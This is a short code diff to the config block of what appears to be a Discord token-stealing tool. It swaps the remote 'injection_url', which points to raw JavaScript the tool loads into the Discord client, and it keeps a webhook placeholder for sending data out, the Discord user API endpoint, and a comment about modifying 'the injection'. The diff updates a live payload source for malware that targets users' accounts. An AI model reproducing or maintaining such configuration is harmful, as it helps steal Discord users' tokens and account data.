@@ -13,7 +13,7 @@ const config = {
     "https://cdn.discordapp.com/avatars/928619303257923635/2101f61a8d6b468698893cb0d8677a15.webp",
   embed_color: 8363488,
   webhook: "%WEBHOOK_LINK%",
-  injection_url: "https://www.toptal.com/developers/hastebin/raw/quroxalavi",
+  injection_url: "https://raw.githubusercontent.com/NobodyWouldEverUseThis7/NobodyWouldEverUseThis8/main/file.js",
   /* DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING */
   api: "https://discord.com/api/v9/users/@me",
   nitro: {
